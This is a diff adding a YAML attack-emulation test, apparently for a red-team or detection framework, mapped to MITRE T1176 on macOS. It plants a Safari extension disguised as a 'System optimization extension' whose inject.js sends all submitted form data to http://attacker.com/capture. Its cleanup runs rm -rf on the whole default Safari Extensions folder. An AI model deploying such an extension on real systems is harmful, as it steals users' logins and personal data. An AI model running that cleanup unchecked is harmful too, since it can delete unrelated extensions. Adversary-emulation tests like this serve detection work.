@@ -1,0 +1,87 @@
+api_version: 2.0
+uuid: 12345678-dddd-dddd-dddd-dddddddddddd
+name: Safari extension injection
+description: Injects malicious Safari extension for browser persistence and data exfiltration
+mitre_attack_id: T1176
+mitre_attack_technique: Browser Extensions
+mitre_attack_tactic: Persistence
+platforms:
+  - darwin
+requirements:
+  platforms:
+    - os: darwin
+args:
+  extension_name:
+    description: Name of the malicious extension
+    type: string
+    default: SafariHelper
+  extension_dir:
+    description: Directory for Safari extensions
+    type: string
+    default: ~/Library/Safari/Extensions
+  manifest_path:
+    description: Path to extension manifest
+    type: string
+    default: ~/Library/Safari/Extensions/SafariHelper.safariextz
+steps:
+  - name: create_extension_directory
+    type: shell_command
+    command: "mkdir -p {{ extension_dir }}"
+  
+  - name: create_extension_manifest
+    type: create_file
+    path: "{{ manifest_path }}"
+    contents: |
+      {
+        "name": "{{ extension_name }}",
+        "version": "1.0",
+        "manifest_version": 2,
+        "description": "System optimization extension",
+        "content_scripts": [
+          {
+            "matches": ["<all_urls>"],
+            "js": ["inject.js"]
+          }
+        ],
+        "background": {
+          "scripts": ["background.js"]
+        },
+        "permissions": [
+          "<all_urls>",
+          "tabs",
+          "webRequest",
+          "webRequestBlocking"
+        ]
+      }
+    permissions: "0644"
+  
+  - name: create_injection_script
+    type: create_file
+    path: "{{ extension_dir }}/inject.js"
+    contents: |
+      // Inject malicious tracking script
+      console.log("Injection script loaded");
+      // Exfiltrate form data
+      document.addEventListener('submit', function(e) {
+        var formData = new FormData(e.target);
+        fetch('http://attacker.com/capture', {
+          method: 'POST',
+          body: formData
+        });
+      });
+    permissions: "0644"
+
+checks:
+  - type: file_exists
+    path: "{{ manifest_path }}"
+  - type: file_exists
+    path: "{{ extension_dir }}/inject.js"
+
+cleanup:
+  - type: remove_file
+    path: "{{ manifest_path }}"
+  - type: remove_file
+    path: "{{ extension_dir }}/inject.js"
+  - type: shell_command
+    command: "rm -rf {{ extension_dir }}" 
+    on_error: ignore
